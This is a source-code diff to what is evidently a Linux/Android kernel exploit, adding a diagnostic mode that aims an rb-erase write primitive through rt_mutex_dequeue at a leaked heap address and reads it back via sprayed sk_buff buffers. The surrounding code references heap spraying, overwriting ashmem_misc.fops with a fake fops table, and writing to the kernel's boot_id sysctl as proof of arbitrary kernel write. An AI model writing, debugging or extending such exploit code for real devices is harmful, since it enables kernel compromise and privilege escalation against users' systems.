@@ -398,6 +398,15 @@ uintptr_t canon_addr(uintptr_t image_addr) {
 }
 
 int bootid_proof_active;
+/* SCRATCH-WRITE-PROOF: aim the rb-erase store at `page_base + SCRATCH_OFF`, an
+ * address that came from the LEAK (not from the static P0_DATA_ALIAS formula), and
+ * read it back by recv()ing the sprayed sk_buffs. Together with the BOOTID proof
+ * (static alias target) one run separates the two remaining possibilities:
+ *   scratch lands + bootid doesn't  => the store works, data_addr()'s delta is wrong
+ *   neither lands                   => the walk isn't reaching rt_mutex_dequeue
+ * (QEMU on this kernel lands the store via the image VA, and measured there that a
+ *  wrong delta silently writes elsewhere -- exactly the observed device symptom.) */
+int scratch_proof_active;
 char bootid_proof_before[64];
 
 int bootid_write_proof_enabled(void) {
@@ -444,7 +453,8 @@ uintptr_t pselect_write_target(void) {
      * /proc/sys/kernel/random/boot_id. Same walk path as the fops route. */
     return data_addr(SYSCTL_BOOTID);
   }
-  if (scratch_write_diag_enabled() && binwrite_target) {
+  if ((scratch_write_diag_enabled() || scratch_proof_active) &&
+      binwrite_target) {
     /* DIAGNOSTIC: aim the rb-erase write at a 0x41-filled scratch qword inside
      * the sprayed page instead of &ashmem_misc.fops, so scratch_diag_readback()
      * can prove (via sk_buff recv) whether the dequeue write lands at all. */
@@ -606,15 +616,15 @@ int scratch_write_diag_enabled(void) {
  * target, 0x41-filled), so a diff carrying `expect` (=write_value=fake_fops) proves
  * the dequeue write actually lands; no diff => the walk isn't writing (shift/overlay).
  */
-void scratch_diag_readback(uint64_t expect) {
+int scratch_diag_readback(uint64_t expect) {
   if (reclaim_sv[1] < 0 || !skb_buf) {
     pr_warning("SCRATCH-DIAG: no reclaim socket/skb_buf (sv=%d)\n", reclaim_sv[1]);
-    return;
+    return 0;
   }
   size_t cap = (size_t)SKB_SEND_SIZE * 8;
   unsigned char *buf = malloc(cap);
   if (!buf) {
-    return;
+    return 0;
   }
   int fl = fcntl(reclaim_sv[1], F_GETFL, 0);
   if (fl >= 0) {
@@ -650,6 +660,7 @@ void scratch_diag_readback(uint64_t expect) {
   pr_success("SCRATCH-DIAG total_recv=%zu diffs=%d write_value_landed=%d expect=%016llx\n",
              total, diffs, found, (unsigned long long)expect);
   free(buf);
+  return found;
 }
 
 void close_ctx_memfds(struct mm_ctx *ctx) {
